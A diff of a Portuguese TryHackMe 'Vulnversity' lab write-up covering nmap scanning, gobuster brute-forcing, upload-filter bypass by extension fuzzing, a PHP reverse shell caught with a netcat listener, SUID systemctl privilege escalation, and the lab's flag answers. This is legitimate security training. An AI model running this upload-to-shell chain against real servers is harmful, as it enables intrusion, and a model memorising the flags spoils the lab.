@@ -1,13 +1,18 @@
-# Vulnversity
+```yaml
+title: Vulnversity - Writeup [TryHackMe]
+description: 'Resumão geral da matéria com resolução de exercício'
+author: matheus
+tags: ["tryhackme", "WriteUps"]
+categories: ["SecLab", "Hacking"]
+pin: false
+comments: true
+```
 
->## Não vou conseguir lembrar a data certinha da primeira vez que fiz, mas estou recomeçando no tryhackme e este é o writeup q eu gostaria de trazer primeiro.
-<br>
+# Vulnversity - Desafio Hacker
 
->### --Vou pular as primeiras tasks que são sobre estar conectado a VPN, ter um sistema com NMAP instalado, estar conectado na máquina do desafio e também pularemos as perguntas que não precisam de resposta.
+> *Será pulado desse writeup as tasks sobre estar conectado a VPN, ter um sistema com NMAP instalado, estar conectado na máquina do desafio e também pularemos as perguntas que não precisam de resposta.*
 
 ## Escaneando
-
-### Scan the box with nmap -sV < machines ip >
 
 ```shell
 nmap -sV 10.10.84.129
@@ -15,54 +20,63 @@ nmap -sV 10.10.84.129
 
  ![image](https://i.imgur.com/gZqOO8D.png)
 
-O nmap é uma ferramenta gratuita, de código aberto e poderosa usada para descobrir hosts e serviços em uma rede de computadores. 
-Utilizamos o nmap para escanear esta máquina para identificar todos os serviços que estão sendo executados em uma porta específica, mas podemos fazer o uso do programa de algumas formas, como:
+### nmap flag    Description
 
-###  nmap flag	Description
-
-
-| Nmap flag     | City   
-| ------------- | --------    |
-| `-sV`         |  `Attempts to determine the version of the services running`   |
-| `-p<x> or -p-`|  `Port scan for port <x> or scan all ports`   |
-| `Pn`          | `Disable host discovery and just scan for open ports` |
-| `-A`	        | `Enables OS and version detection, executes in-build scripts for further enumeration.` | 
-|`-sC`	       | `Scan with the default nmap scripts` | 
-|`-v	`           | `Verbose mode` |
-|`-sU`	       | `UDP port scan` |
-|`-sS`	       | `TCP SYN port scan` |
+| Nmap flag      | City                                                                                   |
+| -------------- | -------------------------------------------------------------------------------------- |
+| `-sV`          | `Attempts to determine the version of the services running`                            |
+| `-p<x> or -p-` | `Port scan for port <x> or scan all ports`                                             |
+| `Pn`           | `Disable host discovery and just scan for open ports`                                  |
+| `-A`           | `Enables OS and version detection, executes in-build scripts for further enumeration.` |
+| `-sC`          | `Scan with the default nmap scripts`                                                   |
+| `-v    `       | `Verbose mode`                                                                         |
+| `-sU`          | `UDP port scan`                                                                        |
+| `-sS`          | `TCP SYN port scan`                                                                    |
 
 ```yml
  nmap -sV -Pn 10.10.84.129
+
+ nmap -sV 10.10.84.129
 ```
 
-Podemos utilizar o HELP do shell para saber mais parâmetros e até ajudar a responder algumas questões.
+O nmap tende a escanear as mil portas mais comuns, é interessante fazer um scan que va nas outras portas acima disso, temos mais de 65 mil portas. 
 
-Algumas coisas que gostaria de add aqui para utilizarmos, poderia ser o seguinte:
+Podemos utilizar o HELP do shell para saber mais parâmetros e até ajudar a responder algumas questões (coloquei acima).
 
-Usar o mais comum em TODAS as portas / entre as portas especificadas (NO EXEMPLO SÃO TODAS POR TERMOS POSTO AS 65535 PORTAS)
+Algumas coisas que gostaria add aqui para utilizarmos, poderia ser o seguinte:
+
+Usar o -sS, que é por tcp SYN
+
+Usar para ir em TODAS as portas ou entre portas especificadas. *(No exemplo são TODAS as 65535 PORTAS, mas feito de forma especificada. Para ir em todas, poderia ter apenas usado -p1-)*
+
 ```shell
 nmap -sS -p1-65535 10.10.84.129
 ```
 
-Podemos utilizar uma forma de agilizar os pacotes com o -T4 (cuidado ao usar o -T5 por ter risco de se derrubar).
+São muitas portas, o que também demandaria MUITO mais tempo também...
 
-Podemos, também utilizar uma força maior no 'verbose' para mostrar tudo na tela de forma mais detalhada o q está acontecendo, nesse caso podemos por -vv
+Podemos utilizar uma forma de agilizar os pacotes com o -T4 (**cuidado ao usar o -T5 por ter risco de te derrubar**). O -T4 e o -T5 manda muitos pacotes de uma só vez para agilizar.
+
+Podemos, também utilizar uma força maior no '*verbose*' para mostrar tudo na tela de forma mais detalhada o q está acontecendo, nesse caso podemos por -vv
+
 ```shell
-sudo nmap -sS -p1-65535 10.10.84.129 -T4 -vv
+sudo nmap -sS -p1- 10.10.84.129 -T4 -vv
 ```
 
 ## Quantas portas estão abertas?
 
 Eu fiz o exercício com o comando:
-```shell
-sudo nmap -Pn 10.10.84.129
-```
-Ou simplesmente poderia ter usado o comando abaixo. que saria uma saída parecida com:
+
 ```shell
 sudo nmap -sV -Pn 10.10.84.129
 ```
-De qualquer forma, a saída sairia - resumidamente e objetivamente - mais ou menos como no exemplo abaixo;
+
+Assim o resultado deu o mesmo sem demorar tanto tempo, para este exercício deu certo.
+
+De qualquer forma, a saída sairia - resumidamente e objetivamente - mais ou menos como no exemplo abaixo; 
+
+***(retirado a aba 'service' e 'version' para melhor visualização)***
+
 ```yaml
 ┌──(laidler㉿kali)-[~/Documents/seclab]
 └─$ nmap -sV -Pn 10.10.84.129
@@ -74,13 +88,16 @@ PORT     STATE
 3128/tcp open
 3333/tcp open
 ```
+
 Podemos ver que temos 6 portas abertas detectadas, o que responde a questão.
-@Answer
+
 ```yaml
  6
 ```
+
 ## Versão do squid proxy?
-No `nmap -sV -Pn 10.10.84.129` mostrado acima, ele não apenas mostra na saída qual a porta e seu estado (aberto), mas também mostra o serviço e qual a versão do mesmo.
+
+Na saída do comando `nmap -sV -Pn 10.10.84.129` mostrado acima, ele não apenas mostra na saída qual a porta e seu estado (aberto), mas também mostra o serviço e qual a versão do mesmo.
 
 Logo, a resposta fica clara na saída deste comando também:
 
@@ -92,20 +109,24 @@ PORT     STATE SERVICE     VERSION
 3128/tcp open  http-proxy  Squid http proxy **3.5.12**
 3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
 ```
+
 `Squid http proxy **3.5.12**`
 
 ```yaml
  3.5.12
 ```
+
 ## NMap escanearia quantas portas com o parâmetro -p-400?
+
 De acordo com o que foi explicado anteriormente, daria para responder numa boa, né? haha.
 
 ```yaml
  400
- ```
+```
 
- ## Já o parâmetro -n, o que o nmap não irá resolver?
- Usando a flag -n no nmap, ele não resolverá os nomes de domínio DNS. Isso significa que o nmap não tentará converter endereços IP em nomes de host. Isso pode ser útil para acelerar as varreduras.
+## Já o parâmetro -n, o que o nmap não irá resolver?
+
+ Usando a flag *-n* no nmap, ele **não** resolverá os nomes de domínio DNS. Isso significa que o nmap não tentará converter endereços IP em nomes de host. Isso pode ser útil para **acelerar** as varreduras.
  Podemos achar essa resposta se usarmos o `HELP` para ver o que cada parâmetro/flag faz.
 
 ```yaml
@@ -113,7 +134,8 @@ De acordo com o que foi explicado anteriormente, daria para responder numa boa, 
 ```
 
 ## Qual sistema operacional provavelmente stá sendo rodado? Qual porta está rodando o web server?
-Ainda usando a mesma saída de `nmap -sV -Pn 10.10.84.129` podemos ver que estamos falando do Ubuntu, com web server na porta 3333, ou seja, temos um site em `http://10.10.84.129:3333`.
+
+Ainda usando a mesma saída de `nmap -sV -Pn 10.10.84.129` podemos ver que estamos falando do Ubuntu, com web server na porta *3333*, ou seja, temos um site em `http://10.10.84.129:3333`.
 
 > Salvo engano, temos como detectar com o parãmetro -A
 
@@ -125,8 +147,7 @@ Ainda usando a mesma saída de `nmap -sV -Pn 10.10.84.129` podemos ver que estam
  3333
 ```
 
-
-># GoBuster - DirBruteforce
+> # GoBuster - DirBruteforce
 
 GoBuster é uma ferramenta usada para forçar bruscamente URIs (diretórios e arquivos), subdomínios DNS e nomes de host virtual. Para esta máquina, vamos nos concentrar em usá-lo para forçar bruscamente os diretórios. 
 Eu geralmente uso outras ferramentas, como o `dirb` ou `dirsearch`, mas esse é bem legal também.
@@ -141,29 +162,31 @@ gobuster dir -u http://<ip>:3333 -w < word list location and/or name >
 
 Vamos utilizar para encontrar um diretório que pode ser usado para fazer o upload de um shell.
 
-### Usando o GoBuster 
+### Usando o GoBuster
+
 Utilizei com uma wordlist baixada que se encontra no mesmo diretório.
 
 ```shell
 `gobuster dir -u http://10.10.84.129:3333 -w common.txt
 ```
+
 > Você pode pesquisar pela wordlist 'directory-list-2.3-medium.txt' que resolverá o desafio.
 
 Parâmetros do GoBuster;
 
-| GoBuster Flag  | Description |
-| -------------- | ------------- |
-| `-e` | `Print the full URLs in your console` |
-| `-u` | `The target URL` |
-| `-w` | `Path to your wordlist` `E.g:  /usr/share/wordlists/dirbuster/` |
-| `-U and -P` |  `Username and Password for Basic Auth` |
-| `-p <x>` | `Proxy to use for requests` |
-| `-c <http cookies>` | `Specify a cookie for simulating your auth` |
-
+| GoBuster Flag       | Description                                                     |
+| ------------------- | --------------------------------------------------------------- |
+| `-e`                | `Print the full URLs in your console`                           |
+| `-u`                | `The target URL`                                                |
+| `-w`                | `Path to your wordlist` `E.g:  /usr/share/wordlists/dirbuster/` |
+| `-U and -P`         | `Username and Password for Basic Auth`                          |
+| `-p <x>`            | `Proxy to use for requests`                                     |
+| `-c <http cookies>` | `Specify a cookie for simulating your auth`                     |
 
 ## Qual diretório é uma aba de upload?
 
 Com o comando e uma saída mais ou menos como:
+
 ```yaml
 ┌──(laidler㉿kali)-[~/Documents/seclab]
 └─$ gobuster dir -u "http://10.10.84.129:3333/" -w common.txt 
@@ -179,37 +202,46 @@ css                  (Status 301) [Size 317] [--> http://10.10.84.129:3333/css/]
 fonts                (Status 301) [Size 319] [--> http://10.10.84.129:3333/fonts/]
 internal             (Status 301) [Size 322] [--> http://10.10.84.129:3333/internal/]
 ```
-podemos perceber que desses diretórios, o único que parece ter algo é o 'internal', então se abrirmos a página `http://10.10.84.129:3333/internal/` iremos perceber que nela temos uma página de upload.
 
-### `@Answer`
+podemos perceber, ao olhar esses diretórios, que o único deles que parece ter algo é o '*internal*', então se abrirmos a página `http://10.10.84.129:3333/internal/` iremos nos deparar com uma página de upload.
+
 ```yaml
  /internal/
 ```
 
-># Comprometer o webserver - Exploração da falha 
+> # Comprometer o webserver - Exploração da falha
 
 ### Now you have found a form to upload files, we can leverage this to upload and execute our payload that will lead to compromising the web server.
+
 ```yaml
  upload evershall.phtml file.
 ```
 
-
 # Answer the questions below
+
 ## What common file type, which you'd want to upload to exploit the server, is blocked? Try a couple to find out.
+
 ```yaml
   .php
 ```
+
 To identify which extensions are not blocked, we're going to fuzz the upload form.
 
 To do this, we're going to use BurpSuite. If you are unsure to what BurpSuite is, or how to set it up please complete our BurpSuite room first.
 
 ![image](https://i.imgur.com/j71CW1A.png)
 
-
-
 We're going to use Intruder (used for automating customised attacks).
 
 To begin, make a wordlist with the following extensions in:
+
+```wordlist.txt
+.php
+.php3
+.php4
+.php5
+.phtml
+```
 
 ![image](https://i.imgur.com/ED153Nx.png)
 
@@ -220,6 +252,7 @@ Click the "Positions" tab now, find the filename and "Add §" to the extension. 
 ![image](https://i.imgur.com/6dxnzq6.png)
 
 ## Run this attack, what extension is allowed?
+
 ```yaml
  .phtml
 ```
@@ -232,32 +265,37 @@ Download the following reverse PHP shell here.
 
 To gain remote access to this machine, follow these steps:
 
-    1. Edit the php-reverse-shell.php file and edit the ip to be your tun0 ip (you can get this by going to http://10.10.10.10 in the browser of your TryHackMe connected device).
+```
+1. Edit the php-reverse-shell.php file and edit the ip to be your tun0 ip (you can get this by going to http://10.10.10.10 in the browser of your TryHackMe connected device).
 
-    2. Rename this file to php-reverse-shell.phtml
+2. Rename this file to php-reverse-shell.phtml
 
-    3. We're now going to listen to incoming connections using netcat. Run the following command: nc -lvnp 1234
+3. We're now going to listen to incoming connections using netcat. Run the following command: nc -lvnp 1234
 
-    4. Upload your shell and navigate to http://<ip>:3333/internal/uploads/php-reverse-shell.phtml - This will execute your payload
+4. Upload your shell and navigate to http://<ip>:3333/internal/uploads/php-reverse-shell.phtml - This will execute your payload
 
-    5. You should see a connection on your netcat session
+5. You should see a connection on your netcat session
+```
 
 ![image](https://i.imgur.com/FGcvTCp.png)
 
 ## What is the name of the user who manages the webserver?
+
 ```yaml
  bill
 ```
+
 ## What is the user flag?
+
 ```yaml
  8bd7992fbe8a6ad22a63361004cfcedb
 ```
 
-># Task 5 Privilege Escalation 
-Now you have compromised this machine, we are going to escalate our privileges and become the superuser (root).
+> # Task 5 Privilege Escalation
+> 
+> Now you have compromised this machine, we are going to escalate our privileges and become the superuser (root).
 
 # Answer the questions below
-
 
 In Linux, SUID (set owner userId upon execution) is a special type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).
 
@@ -266,11 +304,13 @@ For example, the binary file to change your password has the SUID bit set on it 
 ![image](https://i.imgur.com/ZhaNR2p.jpg)
 
 ## On the system, search for all SUID files. What file stands out?
+
 ```yaml
  /bin/systemctl
 ```
 
 ### Its challenge time! We have guided you through this far, are you able to exploit this system further to escalate your privileges and get the final answer?
+
 ```yaml
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ nc -lvnp 9001
@@ -344,6 +384,7 @@ bash-4.3#
 ```
 
 ## Become root and get the last flag (/root/root.txt)
+
 ```yaml
  a58ff8579f0a9270368d33a9966c7fd5
 ```
